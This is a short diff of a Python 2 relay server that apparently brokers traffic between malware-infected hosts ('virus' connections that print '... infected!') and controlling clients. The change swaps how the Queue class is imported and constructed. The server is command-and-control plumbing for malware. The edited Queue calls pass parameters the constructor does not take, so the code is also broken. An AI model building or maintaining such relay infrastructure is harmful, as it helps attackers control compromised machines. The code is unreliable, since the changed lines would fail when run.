@@ -3,7 +3,7 @@ import sys
 from StringIO import StringIO
 import threading, time
 from packet import Packet
-import Queue
+from Queue import Queue,Empty
 import errno
 
 class RelayServer:
@@ -63,7 +63,7 @@ class RelayServer:
 
     def onVirusConnect(self,client,address):
         print address[0] + " infected!"
-        q = Queue.Queue(True,60)
+        q = Queue(block=True,timeout=60)
         self.toVirus[address[0]] = (client,q)
         self.sendIPList()
         t = threading.Thread(target=self.receiveFromVirus,args=[client,address])
@@ -88,7 +88,7 @@ class RelayServer:
 
     def onClientConnect(self,client,address):
         print address[0] + " connected!"
-        q = Queue.Queue(True,60)
+        q = Queue(block=True,timeout=60)
         self.toClient[address[0]] = (client,q)
         self.sendIPList(address)
         t = threading.Thread(target=self.receiveFromClient,args=[client,address])
@@ -126,7 +126,7 @@ class RelayServer:
             try:
                 pkt = q.get()
                 pkt.send(s)
-            except Queue.Empty:
+            except Empty:
                 pass
 
 def main():
